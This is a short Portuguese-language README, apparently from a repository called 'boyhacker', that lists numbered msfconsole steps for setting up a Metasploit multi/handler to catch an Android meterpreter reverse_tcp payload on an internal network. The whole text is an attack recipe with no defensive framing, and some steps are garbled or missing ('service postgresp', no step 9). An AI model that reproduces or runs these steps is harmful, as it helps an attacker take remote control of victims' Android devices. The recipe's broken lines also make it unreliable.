# boyhacker

COMO CONFIGURAR O METASPLOIT EM REDE INTERNA ?
1 - msfdb init
2 service postgresp
3 - msfconsole
4 - use exploit/multi/handler
5- set payload android/meterpreter/reverse_tcp
6 - LHOST ip que foi gerado no payload(ETH0)
7 - LPORT porta que foi gerado o payload
8 - show options (verifique que a porta e o ip estejam em YES, se sim ")
10 - exploit
